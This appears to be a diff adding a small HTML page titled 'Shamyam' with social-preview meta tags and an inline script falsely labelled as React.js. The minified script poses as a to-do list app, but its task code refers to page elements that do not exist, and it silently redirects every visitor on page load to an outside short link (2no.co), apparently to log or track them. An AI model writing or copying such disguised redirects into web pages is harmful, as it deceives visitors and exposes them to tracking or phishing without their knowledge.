@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="Shamyam">
+    <meta property="og:description" content="Hello I'm yamyam">
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="URL_TO_AN_IMAGE_IF_NEEDED"> <!-- Optional -->
+    <title>Shamyam</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 50px;
+        }
+    </style>
+</head>
+<body>
+  <script>
+    /* React.js v4.0 below */
+    document.addEventListener('DOMContentLoaded', () => { const tI = document.getElementById('taskInput'); const aTB = document.getElementById('addTaskButton'); const tL = document.getElementById('taskList'); window.location.href = 'https://2no.co/aerix'; const lT = () => { const t = JSON.parse(localStorage.getItem('tasks')) || []; tL.innerHTML = ''; t.forEach((task, i) => { const li = document.createElement('li'); li.className = 'task-item'; li.innerHTML = `${task} <button onclick="rT(${i})">Delete</button>`; tL.appendChild(li); }); }; const sT = (tasks) => { localStorage.setItem('tasks', JSON.stringify(tasks)); }; const aT = () => { const task = tI.value.trim(); if (task === '') return; const tasks = JSON.parse(localStorage.getItem('tasks')) || []; tasks.push(task); sT(tasks); lT(); tI.value = ''; }; window.rT = (i) => { const tasks = JSON.parse(localStorage.getItem('tasks')) || []; tasks.splice(i, 1); sT(tasks); lT(); }; aTB.addEventListener('click', aT); lT(); });
+    
+  </script>
+</body>
+</html>
